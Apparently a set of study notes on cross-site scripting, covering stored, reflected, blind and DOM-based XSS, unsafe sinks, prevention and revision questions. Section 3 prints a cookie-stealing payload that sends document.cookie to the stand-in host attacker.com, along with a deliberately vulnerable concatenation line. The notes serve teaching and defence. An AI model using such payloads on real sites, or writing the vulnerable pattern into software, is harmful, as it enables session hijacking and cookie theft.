# Cross-Site Scripting (XSS)

## 1. What is Cross-Site Scripting (XSS)?
*   **Definition:** Cross-site scripting (commonly abbreviated as XSS) occurs when an application takes untrusted data and sends it directly to a web browser without proper validation or escaping.
*   **The Attack Mechanism:** Attackers use XSS to inject and execute malicious scripts (typically JavaScript) within the browser of a victim visiting the compromised website.
*   **Common Consequences:**
    *   **Session Hijacking:** Stealing user session cookies to impersonate them.
    *   **Defacement:** Replacing or removing legitimate images or content on the website.
    *   **Redirection:** Forcing the user's browser to redirect from the trusted site to a malicious website.

## 2. Three Common Types of XSS Attacks

1.  **Stored XSS (Persistent XSS):**
    *   The attacker injects a malicious script that becomes permanently stored on the target server (e.g., in a database, a comment forum, or a user profile).
    *   When a legitimate victim requests that information from the server, the server delivers the malicious script directly into their browser, where it executes.
2.  **Reflected XSS:**
    *   The malicious script is reflected off the web server directly to the user, usually via a crafted URL.
    *   *Example:* An attacker sends a phishing email containing a malicious link. When the victim clicks the link, the server receives the malicious script in the URL and reflects it back to the victim's browser, executing the payload.
3.  **Blind XSS:**
    *   A subset of Stored XSS. The attacker injects a payload that is intended to be executed on the backend of an application by an administrator or a privileged user, completely without their knowledge.
    *   The payload may compromise the server itself or attack the admin user who inadvertently triggers it while viewing backend logs or databases.

## 3. The Vulnerability: Unsafe Sinks and Concatenation
The transcript provides an example of how XSS occurs in code. The core vulnerability is concatenating raw user input directly into HTML output.

*   **The Vulnerable Concept:**
    An application builds a string of HTML for an input field:
    `page += "<input name='credit_card' type='text' value='" + request.get("CC") + "'>"`
*   **The Attack:** Instead of providing a credit card number in the "CC" parameter, the attacker inputs malicious JavaScript.
    `"><script>document.location='http://attacker.com/cgi-bin/cookie.cgi?'+document.cookie</script>`
*   **The Result:** The string concatenation breaks out of the input field value and executes the script tag. The payload (`document.location`) steals the victim's session ID (cookie) and sends it to the attacker's server, allowing the attacker to hijack the session.

## 4. Prevention Strategies
To protect applications against XSS, implement the following measures:

1.  **Escape and Validate:** Always escape lists or keywords that seem suspect. Validate all incoming HTTP requests to ensure they do not contain banned HTML tags, escape sequences, or special characters capable of triggering a scripting engine.
2.  **Disable HTTP TRACE:** Turn off HTTP TRACE support on your web server. Attackers can use HTTP TRACE calls via XSS (known as Cross-Site Tracing or XST) to bypass `HttpOnly` cookie protections, collect user cookies, and send them to a malicious server.
3.  **Avoid Unsafe Sinks:** Refactor your code to remove references to unsafe sinks (functions or variables that execute strings as code).
    *   *Bad Practice:* Using `innerHTML` to set content, as it parses and executes any script tags within the string.
    *   *Best Practice:* Use `textContent` or `values` instead, which treat the input strictly as literal text and will not execute it as code.

## Quick Revision Questions & Answers

**1. What is the fundamental mechanism of a Cross-Site Scripting (XSS) attack?**
*   **Answer:** An application takes untrusted data (like user input) and sends it to a web browser without properly validating or escaping it, allowing the browser to execute it as a malicious script.

**2. What is the difference between Stored XSS and Reflected XSS?**
*   **Answer:** In Stored XSS, the malicious script is saved permanently on the server (like in a database) and executed whenever a user views that data. In Reflected XSS, the script is typically delivered via a malicious URL (like in a phishing email) and bounces off the server directly back to the user's browser.

**3. Why is using `innerHTML` in your code considered an "unsafe sink"?**
*   **Answer:** Because `innerHTML` parses any string passed to it as active HTML. If that string contains a malicious `<script>` tag provided by a user, the browser will execute it. Developers should use `textContent` instead.

**4. Why should web administrators disable HTTP TRACE support?**
*   **Answer:** Because attackers can exploit HTTP TRACE calls (via Cross-Site Tracing) to bypass certain security mechanisms and steal user cookies to hijack sessions.

**5. In a Blind XSS attack, who is the typical target of the injected payload?**
*   **Answer:** The typical target is a backend user, such as a system administrator, who unknowingly triggers the hidden payload while viewing backend logs or administrative dashboards.

# Cross-Site Scripting (XSS) Concepts

## 1. Overview of Cross-Site Scripting
*   **Context:** XSS is a type of client-side injection attack.
*   **The Mechanism:** An attacker finds a way to let the browser execute arbitrary JavaScript code, allowing them to circumvent the "same origin policy." The attack manipulates a susceptible website, causing it to deliver harmful JavaScript to its users.
*   **The Vulnerability:** It occurs when an HTML page accepts input that is not properly validated, allowing HTML/JavaScript code to be passed instead of regular text input.
*   **The Result:** The attacker injects a malicious script payload. The victim's browser loads and executes this script because it mistakenly believes the script is a necessary, legitimate part of the webpage.
*   **Impact:** Once the malicious code runs within the target's browser, the attacker can completely compromise the user's interaction with the application, gain data control, and breach privacy.

## 2. Three Types of XSS Attacks

### A. Reflected Cross-Site Scripting
*   **Definition:** Occurs when an application takes data from an HTTP request and incorporates it into the immediate HTTP response in an insecure manner.
*   **Mechanism:** The malicious script is delivered and executed almost immediately upon the user's request.
*   **Example:** A website search bar that reflects the search term back to the user (e.g., "You searched for: [Input]"). If the URL passes `?search=Books`, the page displays "Books". If a hacker inputs `?search=<script>alert('hack')</script>`, the browser immediately executes that script instead of displaying the text.

### B. Stored Cross-Site Scripting
*   **Definition:** Also known as a "persisted attack," this method uses storage and subsequent retrieval to postpone the malicious code attack.
*   **Mechanism:** Unfiltered user inputs act as entry points for scripts that permanently reside on the target servers (like in a database or comment forum).
*   **Impact:** When a user visits the affected page later, the arbitrary code is retrieved from storage and executed. Because it grants malevolent actors control over script execution within the browser, it often paves the way for a comprehensive takeover of user accounts.
*   **Key Difference:** Unlike Reflected XSS (immediate response), Stored XSS finds a permanent storage place on the server.

### C. DOM-Based Cross-Site Scripting
*   **Definition:** DOM stands for Document Object Model (the object representation of an HTML page). In this attack, the payload is injected into a web page by manipulating the client's browser environment directly.
*   **Mechanism:** The attack targets applications that provide a route for data to move from a source to a destination point entirely on the client side.
*   **Sources of Vulnerability:** These sources encompass JavaScript properties capable of hosting malicious input, such as:
    *   `document.URL`
    *   `document.referrer`
    *   `location.search`
    *   `location.hash`

## 3. Cross-Site Scripting Today
*   **The Good News:** Modern web browsers continuously improve and incorporate numerous built-in safeguards to thwart successful XSS attacks.
*   **The Reality:** These browser security measures are not all-encompassing and cannot prevent every XSS attack. Despite diminishing prevalence, XSS remains on the OWASP Top 10 list of cyber attacks.

## Quick Revision Questions & Answers

**1. What fundamental browser security policy does Cross-Site Scripting (XSS) attempt to circumvent?**
*   **Answer:** The same origin policy.

**2. In a Reflected XSS attack, how quickly is the malicious script delivered to the victim?**
*   **Answer:** Immediately. The application takes data from an HTTP request and incorporates it into the immediate response.

**3. Why is Stored XSS also referred to as a "persisted attack"?**
*   **Answer:** Because the malicious script permanently resides on the target server (e.g., in a database) and is executed whenever a user retrieves that stored data.

**4. What does DOM stand for in the context of DOM-based XSS?**
*   **Answer:** Document Object Model.

**5. Name two JavaScript properties that are commonly targeted as sources for malicious input in a DOM-based XSS attack.**
*   **Answer:** Examples include `document.URL`, `document.referrer`, `location.search`, and `location.hash`.
